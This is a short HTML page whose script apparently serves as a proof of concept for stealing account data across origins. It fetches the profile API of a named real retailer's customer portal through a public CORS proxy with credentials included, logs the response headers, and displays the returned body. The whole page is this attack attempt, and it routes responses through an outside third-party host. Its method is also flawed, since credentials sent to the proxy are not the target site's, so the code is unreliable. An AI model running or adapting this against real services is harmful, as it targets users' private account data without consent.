<!DOCTYPE html>
<html>
<body>
<script>
// Use a CORS proxy service
const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
const targetUrl = 'https://mijn.gamma.nl/api/profile';

fetch(proxyUrl + targetUrl, {
  credentials: 'include'
})
.then(r => {
  console.log('status:', r.status, 'ACAO:', r.headers.get('access-control-allow-origin'));
  return r.text();
})
.then(t => { 
  console.log('body:', t); 
  document.body.textContent = t.slice(0, 2000); 
})
.catch(e => console.error('Error:', e));
</script>
</body>
</html>
